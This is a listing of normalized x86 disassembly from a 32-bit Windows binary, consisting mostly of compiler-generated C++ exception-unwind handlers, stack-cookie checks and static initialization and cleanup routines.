mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10081cd0
lea ecx [ ebp - 0x9c ]
jmp sub_10035d10
sub_10081cdb
lea ecx [ ebp - 0xf0 ]
jmp sub_10035d10
sub_10081ce6
lea ecx [ ebp - 0xb8 ]
jmp sub_10035d10
sub_10081cf1
lea ecx [ ebp - 0xd4 ]
jmp sub_10035d10
sub_10081cfc
lea ecx [ ebp - 0x128 ]
jmp sub_10035d10
sub_10081d07
lea ecx [ ebp - 0x10c ]
jmp sub_10035d10
sub_10081d12
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x144 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10081d40
mov eax [ ebp - 0x3c ]
push eax
call sub_10065045
pop ecx
retn
sub_10081d4b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x3c ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_1004c3b6
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10081d80
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_10081d88
lea ecx [ ebp - 0x48 ]
jmp sub_10035d10
sub_10081d90
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10081dc0
mov eax [ ebp - 0x9c ]
push eax
call sub_10065045
pop ecx
retn
sub_10081dce
mov ecx [ ebp - 0x9c ]
jmp sub_10035d10
sub_10081dd9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa0 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10081e10
lea edi [ ebp - 0xd4 ]
jmp sub_10005b80
sub_10081e1b
lea edi [ ebp - 0xd4 ]
jmp sub_10005b80
sub_10081e26
lea edi [ ebp - 0xd8 ]
jmp sub_10005b80
sub_10081e31
lea ecx [ ebp - 0x34 ]
jmp sub_10035d10
sub_10081e39
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x100 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10081e70
lea ecx [ ebp - 0x324 ]
jmp sub_1005e370
sub_10081e7b
lea esi [ ebp - 0x2f8 ]
jmp sub_10024d10
sub_10081e86
mov eax [ ebp - 0x304 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x304 ] 0xfffffffe
mov ebx [ ebp - 0x308 ]
jmp sub_100538b0
sub_10081ea8
lea ecx [ ebp - 0x274 ]
jmp sub_10021250
sub_10081eb3
mov eax [ ebp - 0x310 ]
push eax
mov ecx [ ebp - 0x314 ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_10081eca
mov eax [ ebp - 0x314 ]
push eax
mov ecx [ ebp - 0x310 ]
push ecx
call sub_1001f980
add esp 0x8
retn
sub_10081ee1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x32c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10081f10
mov esi [ ebp - 0x44 ]
jmp sub_1000e930
sub_10081f18
mov ecx [ ebp - 0x44 ]
add ecx 0x94
jmp sub_10035d10
sub_10081f26
mov esi [ ebp - 0x44 ]
add esi 0xb4
jmp sub_1002b960
sub_10081f34
lea ecx [ ebp - 0x2c ]
jmp sub_10035d10
sub_10081f3c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x48 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10081f70
mov esi [ ebp + 0x8 ]
jmp sub_1000e930
sub_10081f78
mov ecx [ ebp + 0x8 ]
add ecx 0x94
jmp sub_10035d10
sub_10081f86
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10081fb0
mov esi [ ebp + 0x8 ]
jmp sub_1000e930
sub_10081fb8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10081fe0
lea ecx [ ebp - 0x12c ]
jmp sub_10035d10
sub_10081feb
lea ecx [ ebp - 0x148 ]
jmp sub_10035d10
sub_10081ff6
lea ecx [ ebp - 0x12c ]
jmp sub_10035d10
sub_10082001
lea ecx [ ebp - 0x148 ]
jmp sub_10035d10
sub_1008200c
lea ecx [ ebp - 0x12c ]
jmp sub_10035d10
sub_10082017
lea ecx [ ebp - 0x148 ]
jmp sub_10035d10
sub_10082022
lea ecx [ ebp - 0x12c ]
jmp sub_10035d10
sub_1008202d
lea ecx [ ebp - 0x164 ]
jmp sub_10035d10
sub_10082038
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082060
lea ecx [ ebp - 0x308 ]
jmp sub_10035d10
sub_1008206b
lea ecx [ ebp - 0x35c ]
jmp sub_10035d10
sub_10082076
lea ecx [ ebp - 0x340 ]
jmp sub_10021250
sub_10082081
lea ecx [ ebp - 0x35c ]
jmp sub_10021250
sub_1008208c
lea ecx [ ebp - 0x324 ]
jmp sub_10021250
sub_10082097
lea ecx [ ebp - 0x378 ]
jmp sub_10035d10
sub_100820a2
lea ecx [ ebp - 0x378 ]
jmp sub_10035d10
sub_100820ad
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3a8 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100820e0
lea esi [ ebp - 0x24 ]
jmp sub_1002e400
sub_100820e8
lea ecx [ ebp - 0x84 ]
jmp sub_10035d10
sub_100820f3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x9c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082120
lea ecx [ ebp - 0x84 ]
jmp sub_10035d10
sub_1008212b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x84 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082160
lea esi [ ebp - 0x8e0 ]
jmp j_sub_100173d0
sub_1008216b
lea esi [ ebp - 0x918 ]
jmp j_sub_100173d0
sub_10082176
lea esi [ ebp - 0x8e8 ]
jmp j_sub_100173d0
sub_10082181
lea esi [ ebp - 0x908 ]
jmp j_sub_100173d0
sub_1008218c
lea esi [ ebp - 0x8f8 ]
jmp j_sub_100173d0
sub_10082197
lea esi [ ebp - 0x900 ]
jmp j_sub_100173d0
sub_100821a2
lea esi [ ebp - 0x8f0 ]
jmp j_sub_100173d0
sub_100821ad
lea esi [ ebp - 0x8d8 ]
jmp j_sub_100173d0
sub_100821b8
lea esi [ ebp - 0x920 ]
jmp j_sub_100173d0
sub_100821c3
lea esi [ ebp - 0x910 ]
jmp j_sub_100173d0
sub_100821ce
lea esi [ ebp - 0x928 ]
jmp j_sub_100173d0
sub_100821d9
lea esi [ ebp - 0x938 ]
jmp j_sub_100173d0
sub_100821e4
lea ecx [ ebp - 0x7ec ]
jmp sub_10035d10
sub_100821ef
lea ecx [ ebp - 0x808 ]
jmp sub_10035d10
sub_100821fa
lea ecx [ ebp - 0x824 ]
jmp sub_10035d10
sub_10082205
lea ecx [ ebp - 0x840 ]
jmp sub_10035d10
sub_10082210
lea ecx [ ebp - 0x894 ]
jmp sub_10035d10
sub_1008221b
lea ecx [ ebp - 0x878 ]
jmp sub_10035d10
sub_10082226
lea ecx [ ebp - 0x8b0 ]
jmp sub_10035d10
sub_10082231
lea ecx [ ebp - 0x85c ]
jmp sub_10035d10
sub_1008223c
lea ecx [ ebp - 0x8cc ]
jmp sub_10035d10
sub_10082247
lea ecx [ ebp - 0x840 ]
jmp sub_10035d10
sub_10082252
lea ecx [ ebp - 0x824 ]
jmp sub_10035d10
sub_1008225d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x93c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082290
lea ecx [ ebp - 0x64 ]
jmp sub_10035d10
sub_10082298
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_1004c3b6
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100822c0
lea ecx [ ebp - 0x148 ]
jmp sub_10035d10
sub_100822cb
lea ecx [ ebp - 0x164 ]
jmp sub_10021250
sub_100822d6
lea ecx [ ebp - 0x180 ]
jmp sub_10021250
sub_100822e1
lea ecx [ ebp - 0x19c ]
jmp sub_10021250
sub_100822ec
lea ecx [ ebp - 0x12c ]
jmp sub_10035d10
sub_100822f7
lea ecx [ ebp - 0x12c ]
jmp sub_10035d10
sub_10082302
lea ecx [ ebp - 0x12c ]
jmp sub_10035d10
sub_1008230d
lea ecx [ ebp - 0x12c ]
jmp sub_10035d10
sub_10082318
lea ecx [ ebp - 0x12c ]
jmp sub_10035d10
sub_10082323
lea ecx [ ebp - 0x30 ]
jmp sub_10035d10
sub_1008232b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1dc ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082360
lea ecx [ ebp - 0x30 ]
jmp sub_10021250
sub_10082368
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x60 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082390
lea ecx [ ebp - 0x148 ]
jmp sub_10021250
sub_1008239b
lea esi [ ebp - 0x194 ]
jmp sub_1004c570
sub_100823a6
lea ecx [ ebp - 0x34 ]
jmp sub_10021250
sub_100823ae
lea ecx [ ebp - 0x164 ]
jmp sub_10035d10
sub_100823b9
lea ecx [ ebp - 0x34 ]
jmp sub_10035d10
sub_100823c1
lea ecx [ ebp - 0x34 ]
jmp sub_10021250
sub_100823c9
lea ecx [ ebp - 0x34 ]
jmp sub_10035d10
sub_100823d1
lea ecx [ ebp - 0x34 ]
jmp sub_10035d10
sub_100823d9
lea ecx [ ebp - 0x34 ]
jmp sub_10035d10
sub_100823e1
lea ecx [ ebp - 0x34 ]
jmp sub_10035d10
sub_100823e9
lea ecx [ ebp - 0x34 ]
jmp sub_10021250
sub_100823f1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1a8 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082420
lea ebx [ ebp - 0x1c ]
jmp sub_100538b0
sub_10082428
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082450
lea ecx [ ebp - 0x2c ]
jmp sub_10021250
sub_10082458
lea ecx [ ebp - 0x48 ]
jmp sub_10021250
sub_10082460
lea ecx [ ebp - 0x80 ]
jmp sub_10021250
sub_10082468
lea ecx [ ebp - 0x64 ]
jmp sub_10021250
sub_10082470
lea ecx [ ebp - 0x9c ]
jmp sub_10021250
sub_1008247b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xa4 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100824b0
mov eax [ ebp - 0x14 ]
push eax
call sub_10065045
pop ecx
retn
sub_100824bb
mov eax [ ebp - 0x14 ]
push eax
call sub_10065045
pop ecx
retn
sub_100824c6
mov eax [ ebp - 0x14 ]
push eax
call sub_10065045
pop ecx
retn
sub_100824d1
mov eax [ ebp - 0x14 ]
push eax
call sub_10065045
pop ecx
retn
sub_100824dc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082500
mov eax [ ebp - 0x278 ]
jmp sub_1005fd00
sub_1008250b
lea eax [ ebp - 0x268 ]
jmp sub_100260d0
sub_10082516
lea eax [ ebp - 0x270 ]
jmp sub_100260d0
sub_10082521
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x27c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082550
mov eax [ ebp - 0x238 ]
jmp sub_1005fd00
sub_1008255b
lea eax [ ebp - 0x23c ]
jmp sub_100260d0
sub_10082566
lea eax [ ebp - 0x244 ]
jmp sub_100260d0
sub_10082571
lea ecx [ ebp - 0x234 ]
jmp sub_10035d10
sub_1008257c
lea ecx [ ebp - 0x234 ]
jmp sub_10035d10
sub_10082587
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24c ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100825b0
mov eax [ ebp - 0x430 ]
jmp sub_1005fd00
sub_100825bb
lea ebx [ ebp - 0x440 ]
jmp sub_100538b0
sub_100825c6
lea esi [ ebp - 0x98 ]
jmp sub_10024d10
sub_100825d1
lea esi [ ebp - 0x198 ]
jmp sub_10024d10
sub_100825dc
lea esi [ ebp - 0x298 ]
jmp sub_10024d10
sub_100825e7
lea esi [ ebp - 0x398 ]
jmp sub_10024d10
sub_100825f2
lea esi [ ebp - 0x218 ]
jmp sub_10024d10
sub_100825fd
lea esi [ ebp - 0x118 ]
jmp sub_10024d10
sub_10082608
lea esi [ ebp - 0x318 ]
jmp sub_10024d10
sub_10082613
lea esi [ ebp - 0x418 ]
jmp sub_10024d10
sub_1008261e
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x444 ]
mov ecx [ edx - 0x448 ]
xor ecx eax
call sub_1004c3b6
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082650
lea ecx [ ebp - 0x2b8 ]
jmp sub_10021250
sub_1008265b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c8 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082690
lea esi [ ebp - 0x90 ]
jmp sub_10016390
sub_1008269b
lea eax [ ebp - 0x46c ]
push eax
call sub_10031010
retn
sub_100826a8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x478 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100826d0
lea ecx [ ebp - 0x30 ]
jmp sub_10035d10
sub_100826d8
lea esi [ ebp - 0x64 ]
jmp sub_1002e400
sub_100826e0
lea esi [ ebp - 0x54 ]
jmp sub_10016390
sub_100826e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082710
lea ecx [ ebp - 0xbc ]
jmp sub_10035d10
sub_1008271b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc0 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082750
lea esi [ ebp - 0x498 ]
jmp sub_1002e400
sub_1008275b
lea esi [ ebp - 0x47c ]
jmp sub_10016390
sub_10082766
lea eax [ ebp - 0x504 ]
jmp sub_10054700
sub_10082771
lea ecx [ ebp - 0x458 ]
jmp sub_10035d10
sub_1008277c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x508 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100827b0
lea esi [ ebp - 0x304 ]
jmp sub_1002b960
sub_100827bb
lea esi [ ebp - 0x318 ]
jmp sub_1002e400
sub_100827c6
lea esi [ ebp - 0x298 ]
jmp sub_10016390
sub_100827d1
lea eax [ ebp - 0x2f0 ]
jmp sub_10054700
sub_100827dc
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x324 ]
mov ecx [ edx - 0x328 ]
xor ecx eax
call sub_1004c3b6
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082810
lea esi [ ebp - 0x30c ]
jmp sub_1002e400
sub_1008281b
lea esi [ ebp - 0x298 ]
jmp sub_10016390
sub_10082826
lea eax [ ebp - 0x2f0 ]
jmp sub_10054700
sub_10082831
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x31c ]
mov ecx [ edx - 0x320 ]
xor ecx eax
call sub_1004c3b6
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082860
lea esi [ ebp - 0x310 ]
jmp sub_1002e400
sub_1008286b
lea eax [ ebp - 0x2f0 ]
jmp sub_10054700
sub_10082876
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x324 ]
mov ecx [ edx - 0x328 ]
xor ecx eax
call sub_1004c3b6
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100828b0
lea ecx [ ebp - 0x60 ]
jmp sub_10035d10
sub_100828b8
lea edi [ ebp - 0x68 ]
jmp sub_10014890
sub_100828c0
lea edi [ ebp - 0x68 ]
jmp sub_10014890
sub_100828c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100828f0
lea ecx [ ebp - 0x84 ]
jmp sub_10035d10
sub_100828fb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2ec ]
xor ecx eax
call sub_1004c3b6
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082930
lea esi [ ebp - 0x570 ]
jmp sub_100453a0
sub_1008293b
lea ecx [ ebp - 0x58c ]
jmp sub_10021250
sub_10082946
lea ecx [ ebp - 0x514 ]
jmp sub_10021250
sub_10082951
lea ecx [ ebp - 0x530 ]
jmp sub_10021250
sub_1008295c
lea ecx [ ebp - 0x4f8 ]
jmp sub_10021250
sub_10082967
mov eax [ ebp - 0x594 ]
push eax
call sub_10065045
pop ecx
retn
sub_10082975
lea ecx [ ebp - 0x530 ]
jmp sub_10021250
sub_10082980
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x594 ]
mov ecx [ edx - 0x598 ]
xor ecx eax
call sub_1004c3b6
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_100829b0
mov ecx rw-data
jmp sub_10035d10
sub_100829ba
mov ecx rw-data
jmp sub_10035d10
sub_100829c4
mov ecx rw-data
jmp sub_10035d10
sub_100829ce
mov ecx rw-data
jmp sub_10035d10
sub_100829d8
mov ecx rw-data
jmp sub_10035d10
sub_100829e2
mov esi rw-data
jmp sub_1004dc30
sub_100829ec
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1004c3b6
mov eax r--data
jmp sub_1002473f
sub_10082a10
call sub_1005ff30
push sub_10083070
call sub_10025945
pop ecx
retn
sub_10082d70
mov [ rw-data ] 0x0
retn
sub_10082d80
push sub_100832e0
call sub_10025945
pop ecx
retn
sub_10082d90
push 0x0
push r--data
mov ecx rw-data
call sub_1005d090
push sub_100830d0
call sub_10025945
pop ecx
retn
sub_10082db0
push 0x0
push r--data
mov ecx rw-data
call sub_1005d090
push sub_10083100
call sub_10025945
pop ecx
retn
sub_10082dd0
push 0x0
push r--data
mov ecx rw-data
call sub_1005d090
push sub_10083130
call sub_10025945
pop ecx
retn
sub_10082fe9
push sub_10083347
call sub_10025945
pop ecx
retn
sub_10082ff5
push sub_10083352
call sub_10025945
pop ecx
retn
sub_10083001
push sub_1008335d
call sub_10025945
pop ecx
retn
sub_1008300d
push sub_10083372
call sub_10025945
pop ecx
retn
sub_10083019
push sub_10083368
call sub_10025945
pop ecx
retn
sub_10083025
mov ecx rw-data
call sub_10036aca
push sub_1008337c
call sub_10025945
pop ecx
retn
sub_1008303b
mov ecx rw-data
call sub_10036aca
push sub_100833ae
call sub_10025945
pop ecx
retn
sub_10083051
push sub_100833b8
call sub_10025945
pop ecx
retn
sub_10083060
push r-xdata
call sub_10025945
pop ecx
retn
sub_10083070
mov ecx rw-data
jmp sub_10016f40
j_sub_100129b0
jmp sub_100129b0
sub_10083090
cmp [ rw-data ] 0x8
jb r-xdata
xor ecx ecx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
retn
mov eax [ rw-data ]
push eax
call sub_10065045
add esp 0x4
sub_100830d0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_10065045
add esp 0x4
sub_10083100
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_10065045
add esp 0x4
sub_10083130
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_10065045
add esp 0x4
sub_10083333
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10019b04
sub_10083347
mov [ rw-data ] r--data
retn
sub_10083352
mov [ rw-data ] r--data
retn
sub_1008335d
mov [ rw-data ] r--data
retn
sub_10083368
mov ecx rw-data
jmp sub_1002a730
sub_10083372
mov ecx rw-data
jmp sub_10016be1
sub_1008337c
mov ecx rw-data
jmp sub_10038065
sub_10083386
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10019b04
sub_1008339a
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_10019b04
sub_100833ae
mov ecx rw-data
jmp sub_10038065
sub_100833b8
mov ecx rw-data
jmp sub_10009404
